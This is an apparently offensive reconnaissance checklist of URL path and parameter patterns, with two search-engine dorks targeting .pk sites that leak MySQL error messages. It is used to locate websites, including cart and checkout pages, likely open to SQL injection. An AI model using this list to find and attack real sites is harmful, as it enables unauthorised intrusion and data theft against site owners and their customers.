<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_book.php?CAT=</p>
</li>
<li><input disabled="" type="checkbox"> <p>www/index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>schule/termine.php?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goods_detail.php?data=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storemanager/contents/item.php?page_code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customer/board.htm?mode=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help/com_view.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>n_replyboard.php?typeboard=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng_board/view.php?T=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prev_results.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/view.php?no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gnu/?doc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>zb/view.php?uid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global/product/product.php?gubun=</p>
</li>
<li><input disabled="" type="checkbox"> <p>m_view.php?ps_db=</p>
</li>
<li><input disabled="" type="checkbox"> <p>naboard/memo.php?bd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookmark/mybook/bookmark.php?bookPageNo=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/board.html?table=</p>
</li>
<li><input disabled="" type="checkbox"> <p>kboard/kboard.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.asp?lotid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/board/view****.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goboard/front/board_view.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/bbsView.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>boardView.php?bbs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng/rgboard/view.php?&amp;bbs_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?cate=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?module=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pagina=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>notify/notify_form.php?topic_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>php/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>constructies/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>php/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?section=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_bug.cgi?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>today.php?eventid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>module/range/dutch_windmill_collection.php?rangeId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_bug.cgi?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?groupid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>projdetails.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsitem.php?newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p><strong>****</strong>s_in_area.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productsview.php?proid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rss.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pub/pds/pds_view.php?start=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?rub=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ogloszenia/rss.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazin.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>galerie.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>www/index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/read.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id_h=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?book=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?act=</p>
</li>
<li><input disabled="" type="checkbox"> <p>reply.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>stat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>free_board/board_view.html?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gb/comment.php?gb_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gb/comment.php?gb_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>classifieds/showproduct.php?product=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?pageNum_rscomp=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart/addToCart.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/pages/index.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id</p>
</li>
<li><input disabled="" type="checkbox"> <p>display.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ponuky/item_show.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main/magpreview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>zine/board.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?arti_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mall/more.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board_view.php?s_board_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>KM/BOARD/readboard.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board_view.html?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?cont_title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mall/more.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>irbeautina/product_detail.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index_en.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bid/topic.php?TopicID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news_content.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>front/bin/forumview.phtml?bbcode=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>stat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>veranstaltungen/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/conference_register.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rss/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rtfe.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>classifieds/detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tools/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>channel/channel-layout.php?objId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/programme.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/parts/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.html?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>picgallery/category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>displayArticleB.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>knowledge_base/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bpac/calendar/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mb_showtopic.php?topic_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>exhibition_overview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>singer/detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?X_EID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?ISBN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>htmlpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>story.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tools/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>php/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>articlecategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ibp.php?ISBN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>club.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>aboutchiangmai/details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop_display_products.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules/content/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>printcards.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?TID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>general.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>referral/detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cemetery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>exhibitions/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>edatabase/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages/video.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>about_us.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>recipe/category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>en/main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>More_Details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print-story.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>psychology/people/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article_preview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Pages/whichArticle.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Sales/view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>knowledge_base/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery/gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detailedbook.php?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fatcat/home.php?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>static.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>answer/default.php?pollID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/unique_event.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery/detail.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/showthread.php?t=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>knowledge_base/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>html/print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Shop/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gallery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/index.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>auction/item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>clan_page.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?sku=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comments.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>fshstatistic/index.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>sport.php?revista=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?openparent=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/shownewsarticle.php?articleid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>discussions/10/9/?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>trailer.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item/detail.php?num=</p>
</li>
<li><input disabled="" type="checkbox"> <p>features/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site/?details&amp;prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>remixer.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>proddetails_print.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pylones/item.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cont=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?ItemId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>video.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>filemanager.php?delete=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsletter.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>designcenter/item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/kboard.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/view_temp.php?table=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazine-details.php?magid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site:.pk intext:Warning: mysql_free_result(): supplied argument is not a valid MySQL result resource in &amp; “id”</p>
</li>
<li><input disabled="" type="checkbox"> <p>site:.pk intext:Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in &amp; “id”</p>
</li>
<li><input disabled="" type="checkbox"> <p>about.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>accinfo.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>acclogin.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>add_cart.php?num=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addcart.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>addItem.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>add-to-cart.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addToCart.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>addtomylist.php?ProdId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>adminEditProductFields.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>advSearch_h.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliate-agreement.cfm?storeid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>affiliates.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ancillary.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>archive.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>phpx?PageID</p>
</li>
<li><input disabled="" type="checkbox"> <p>basket.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Book.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_list.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book_view.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>BookDetails.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browse_item_details.php Browse_Item_Details.php?Store_Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?</p>
</li>
<li><input disabled="" type="checkbox"> <p>buy.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bycategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cardinfo.php?card=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?cart_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_additem.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart_validate.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cartadd.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat.php?iCat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog.php?CatalogID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_item.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>catalog_main.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categorydisplay.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout.php?UserID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout_confirmed.php?order_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>checkout1.php?cartid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_listCategoriesAndProducts.php?idCategory=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optEmailToFriendForm.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_optReviewReadExec.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comersus_viewItem.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>comments_form.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>contact.php?cartId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customerService.php?ID1=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?catID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>description.php?bookid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?BookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Press_Release_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Product_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?Service_ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>displayproducts.php</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloadTrial.php?intProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailproduct.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>emailToFriend.php?idProduct=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq.php?cartID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faq_list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>faqs.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>feedback.php?title=</p>
</li>
